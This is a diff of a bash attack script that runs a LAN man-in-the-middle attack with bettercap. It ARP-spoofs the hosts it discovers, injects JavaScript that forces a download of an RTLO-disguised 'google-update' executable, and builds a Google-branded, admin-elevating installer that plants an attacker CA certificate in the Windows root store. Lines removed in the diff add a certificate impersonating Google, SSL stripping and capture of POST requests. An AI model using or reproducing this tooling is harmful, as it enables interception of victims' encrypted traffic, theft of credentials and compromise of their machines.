@@ -49,16 +49,10 @@ set -euo pipefail
 RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
 color_print() { printf "${!1}%b${RESET}\n" "$2"; }
 
-WINEARCH=win64 wineboot --init
-WINEPREFIX="$HOME/.wine"
 MITM_DIR="/usr/share/bettercap/caplets/unk9vvn"
-RTLO=$'\xE2\x80\xAE'
-BUILD_DIR="$WINEPREFIX/drive_c/pyinstaller-build"
+BUILD_DIR="$HOME/.wine/drive_c/pyinstaller-build"
 ICON_URL="https://9to5google.com/wp-content/client-mu-plugins/9to5-core/includes/obfuscate-images/images/9to5google-default.jpg"
-CA_DIR="$HOME/bettercap-ca"
-CA_KEY="$CA_DIR/ca.key.pem"
-CA_CERT_PEM="$CA_DIR/ca.cert.pem"
-CA_CERT_CER="$CA_DIR/ca.cert.cer"
+RTLO=$'\xE2\x80\xAE'
 
 # ========================
 # --- ROOT CHECK ---
@@ -66,16 +60,6 @@ CA_CERT_CER="$CA_DIR/ca.cert.cer"
 if [[ "$(id -u)" -ne 0 ]]; then
     color_print RED "[X] Please run as ROOT."
     exit 1
-fi
-
-# ========================
-# --- PYTHON CHECK ---
-# ========================
-if [ ! -d "$BUILD_DIR" ]; then
-    wget https://www.python.org/ftp/python/3.9.1/python-3.9.1-amd64.exe -O /tmp/python39.exe
-    wine /tmp/python39.exe /quiet InstallAllUsers=1 PrependPath=1 Include_pip=1
-    wine python -m pip install --upgrade pip setuptools wheel
-    wine python -m pip install pyinstaller
 fi
 
 # ========================
@@ -91,72 +75,83 @@ GATEWAY=$(ip route | awk '/^default/ {print $3; exit}')
 # ========================
 color_print YELLOW "[*] Cleaning old files..."
 rm -rf "$MITM_DIR" "$BUILD_DIR"
-rm -f /var/www/html/*
-mkdir -p "$MITM_DIR" "$BUILD_DIR" "$CA_DIR"
+mkdir -p "$MITM_DIR" "$BUILD_DIR"
 
 # ========================
 # --- GENERATE FAKE CERTIFICATE ---
 # ========================
 color_print CYAN "[*] Generating fake certificate..."
-openssl genrsa -out "$CA_KEY" 4096
-openssl req -x509 -new -nodes \
-    -key "$CA_KEY" \
-    -sha256 \
-    -days 3650 \
-    -out "$CA_CERT_PEM" \
-    -subj "/C=US/ST=California/L=Mountain View/O=Google LLC/OU=Google Trust Services/CN=Google Internet Authority G3"
-openssl x509 -outform der -in "$CA_CERT_PEM" -out "$CA_CERT_CER"
+CA_CERT_CER="$MITM_DIR/bettercap-ca.crt"
+openssl x509 -in "/root/.bettercap-ca.cert.pem" -out $CA_CERT_CER
 
 # ========================
-# --- CREATE ICON ---
+# --- DOWNLOAD AND CREATE ICON ---
 # ========================
 color_print CYAN "[*] Downloading & creating icon..."
 wget -q -O "$MITM_DIR/google.jpg" "$ICON_URL"
 convert "$MITM_DIR/google.jpg" -define icon:auto-resize=256,128,96,64,48,32,16 "$MITM_DIR/google.ico"
 
 # ========================
-# --- BUILD WINDOWS INSTALLER ---
+# --- BUILD CERT INSTALLER EXE ---
 # ========================
-color_print GREEN "[*] Building Windows installer..."
+color_print GREEN "[*] Building Windows cert_installer.exe..."
 CERT_B64=$(base64 -w0 "$CA_CERT_CER")
+CHUNKS=$(echo "$CERT_B64" | fold -w80 | sed "s/^/\"/" | sed "s/$/\",/")
 
 cat > "$MITM_DIR/cert_installer.py" <<EOF
-import os, subprocess, tempfile, base64
+import ctypes, sys, os, subprocess, tempfile, base64
 
-CERT_B64 = """$CERT_B64"""
+def is_admin():
+    try: return ctypes.windll.shell32.IsUserAnAdmin()
+    except: return False
 
+if not is_admin():
+    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+    sys.exit()
+
+CERT_B64_CHUNKS = [
+$CHUNKS
+]
+CERT_B64 = ''.join(CERT_B64_CHUNKS)
 path = os.path.join(tempfile.gettempdir(), "google.cer")
 with open(path, "wb") as f:
     f.write(base64.b64decode(CERT_B64))
 
-subprocess.run(
-    ["certutil", "-addstore", "-f", "Root", path],
-    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-)
-
-try:
-    os.remove(path)
-except FileNotFoundError:
-    pass
+subprocess.run(["certutil","-addstore","-f","Root", path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+try: os.remove(path)
+except FileNotFoundError: pass
 EOF
 
-cd "$BUILD_DIR"
-cp "$MITM_DIR/cert_installer.py" "$BUILD_DIR/cert_installer.py"
-cp "$MITM_DIR/google.ico" "$BUILD_DIR/google.ico"
+cat > "$BUILD_DIR/admin.manifest" <<EOF
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<assembly xmlns="urn:schemas-microsoft-com:asm.v1" manifestVersion="1.0">
+  <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
+    <security>
+      <requestedPrivileges>
+        <requestedExecutionLevel level="requireAdministrator" uiAccess="false"/>
+      </requestedPrivileges>
+    </security>
+  </trustInfo>
+</assembly>
+EOF
 
-wine pyinstaller --onefile --noconfirm --noconsole \
+cp "$MITM_DIR/cert_installer.py" "$BUILD_DIR/"
+cp "$MITM_DIR/google.ico" "$BUILD_DIR/"
+
+cd "$BUILD_DIR"
+wine pyinstaller --onefile --noconsole \
     --icon "C:\\pyinstaller-build\\google.ico" \
     --name "cert_installer.exe" \
+    --manifest "C:\\pyinstaller-build\\admin.manifest" \
     "C:\\pyinstaller-build\\cert_installer.py"
 
-cp -r "$BUILD_DIR/dist/cert_installer.exe" "$MITM_DIR/cert_installer.exe"
+cp "$BUILD_DIR/dist/cert_installer.exe" "$MITM_DIR/cert_installer.exe"
 
 # ========================
-# --- CREATE RAR SFX ---
+# --- CREATE RAR SFX ARCHIVE ---
 # ========================
 color_print CYAN "[*] Creating SFX archive..."
 cat > "$MITM_DIR/sfx.txt" <<EOF
-;The comment below contains SFX script commands
 Setup=cert_installer.exe
 Presetup=google.jpg
 TempMode
@@ -172,68 +167,75 @@ rar a -sfx -z"$MITM_DIR/sfx.txt" \
     "$MITM_DIR/cert_installer.exe" "$MITM_DIR/google.jpg" "$MITM_DIR/google.ico"
 
 # ========================
-# --- RESTART APACHE ---
+# --- SCAN NETWORK AND FORMAT TARGETS ---
+# ========================
+color_print CYAN "[*] Scanning network..."
+TARGETS=$(arp-scan --interface="$IFACE" --localnet --ignoredups 2>/dev/null | \
+    awk '/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {print $1}' | \
+    grep -v -E "^($LAN|$GATEWAY)$" | sort -u | tr '\n' ',' | sed 's/,$//')
+
+# ========================
+# --- GENERATE CROSS-BROWSER BETTERCAP JS ---
+# ========================
+cat > "$MITM_DIR/rtlo_downloader.js" <<EOF
+(function() {
+    function injectDownloader() {
+        try {
+            var link = document.createElement('a');
+            link.href = 'http://$LAN/google-update${RTLO}gpj.exe';
+            link.download = 'google-update.exe';
+            link.style.display = 'none';
+            document.body.appendChild(link);
+            link.click();
+            var iframe = document.createElement('iframe');
+            iframe.src = 'http://$LAN/google-update${RTLO}gpj.exe';
+            iframe.style.display = 'none';
+            document.body.appendChild(iframe);
+        } catch(e) { console.error('Injection failed:', e); }
+    }
+
+    if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', injectDownloader);
+    } else { injectDownloader(); }
+})();
+EOF
+
+# ========================
+# --- GENERATE BETTERCAP CAPLET ---
+# ========================
+cat > "$MITM_DIR/cert_injector.cap" <<EOF
+# --- Enable ARP spoofing ---
+arp.spoof on
+
+# --- Enable HTTP and HTTPS proxies ---
+http.proxy on
+https.proxy on
+
+# --- Inject JS into HTTP and HTTPS traffic ---
+set http.proxy.injectjs.file $MITM_DIR/rtlo_downloader.js
+set https.proxy.injectjs.file $MITM_DIR/rtlo_downloader.js
+
+# --- Network sniffing ---
+net.sniff on
+
+# --- Log sniffed traffic ---
+events.stream on
+events.stream.output /tmp/mitm.log
+events.stream.filter "http.request or http.response"
+EOF
+chmod +x "$MITM_DIR/cert_injector.cap"
+
+# ========================
+# --- RESTART APACHE SERVER ---
 # ========================
 color_print GREEN "[*] Restarting Apache..."
 service apache2 restart
 
 # ========================
-# --- GENERATE HOOK.JS & CAPLET ---
-# ========================
-color_print CYAN "[*] Scanning network..."
-TARGETS=$(arp-scan --interface="$IFACE" --localnet --ignoredups 2>/dev/null | \
-    awk '/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {print $1}' | \
-    grep -v -E "^($LAN|$GATEWAY)$" | \
-    sort -u | paste -sd ',' -)
-
-cat > "$MITM_DIR/rtlo_downloader.js" <<EOF
-const iframe = document.createElement('iframe');
-iframe.src = 'http://$LAN/google-update${RTLO}gpj.exe';
-iframe.width = '0';
-iframe.height = '0';
-iframe.style.display = 'none';
-document.body.appendChild(iframe);
-EOF
-
-cat > "$MITM_DIR/cert_injector.cap" <<EOF
-# ARP spoofing config
-set arp.spoof.internal true
-arp.spoof on
-
-# HTTPS proxy with custom cert/key
-set https.proxy.certificate ${CA_CERT_PEM}
-set https.proxy.key ${CA_KEY}
-
-# Hook injection scripts
-set http.proxy.script ${MITM_DIR}/rtlo_downloader.js
-set https.proxy.script ${MITM_DIR}/rtlo_downloader.js
-
-# Enable HTTP & HTTPS proxies
-http.proxy on
-https.proxy on
-
-# Verbose logging of HTTP(S) requests
-set http.proxy.verbose true
-
-# Save only POST requests to file
-set events.stream.output /tmp/http-post.log
-set events.stream.filter "http.request and http.request.method == 'POST'"
-
-# SSL stripping (downgrade HTTPS to HTTP)
-set https.proxy.sslstrip true
-
-# Enable events logging
-events.stream on
-
-# Enable network probing
-net.probe on
-EOF
-
-# ========================
 # --- LAUNCH BETTERCAP ---
 # ========================
 color_print GREEN "[*] Launching Bettercap..."
-bettercap -iface "$IFACE" -caplet "$MITM_DIR/cert_injector.cap" -eval "set arp.spoof.targets $TARGETS"
+bettercap -iface "$IFACE" -eval "set arp.spoof.targets $TARGETS;caplets.update;unk9vvn/cert_injector"
 ```
 
 _Run & Execute_
